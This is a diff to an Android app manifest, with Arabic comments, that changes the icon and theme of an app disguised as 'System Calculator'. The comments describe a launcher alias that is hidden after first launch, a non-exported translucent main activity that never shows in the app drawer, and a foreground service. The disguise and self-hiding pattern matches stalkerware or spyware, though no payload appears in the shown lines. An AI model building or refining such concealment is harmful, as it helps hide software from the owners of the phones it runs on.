@@ -84,7 +84,8 @@
 
         <!-- ============================================================
              ✅ النشاط الوهمي (Alias) – نقطة الدخول الوحيدة المرئية
-             - يظهر في درج التطبيقات باسم "System Calculator" وأيقونة نظامية
+             - يظهر في درج التطبيقات باسم "System Calculator"
+             - ✅ تم تغيير الأيقونة إلى ic_menu_edit (موجودة في جميع إصدارات Android)
              - عند تشغيله، يتم تشغيل MainActivity الحقيقي
              - بعد التشغيل الأول، يتم إخفاء هذا Alias بواسطة MainActivity.disableLauncherIcon()
         ============================================================ -->
@@ -92,7 +93,7 @@
             android:name=".MainActivityAlias"
             android:targetActivity=".MainActivity"
             android:exported="true"
-            android:icon="@android:drawable/ic_menu_calculator"
+            android:icon="@android:drawable/ic_menu_edit"
             android:label="@string/app_name_alias"
             android:theme="@style/Theme.AppCompat">
             <intent-filter>
@@ -105,6 +106,7 @@
              ✅ النشاط الحقيقي – مخفي وغير مرئي في درج التطبيقات
              - exported="false" يمنع الوصول من خارج التطبيق
              - بدون intent-filter للـ LAUNCHER، لا يظهر في درج التطبيقات
+             - ✅ تم تغيير الثيم إلى Theme.Translucent.NoTitleBar (ثيم نظامي مضمون الوجود)
         ============================================================ -->
         <activity
             android:name=".MainActivity"
@@ -112,7 +114,7 @@
             android:exported="false"
             android:launchMode="singleTop"
             android:screenOrientation="portrait"
-            android:theme="@style/Theme.AppCompat.Translucent.NoActionBar" />
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <!-- ============================================================
              ✅ الخدمة الأمامية (Foreground Service)
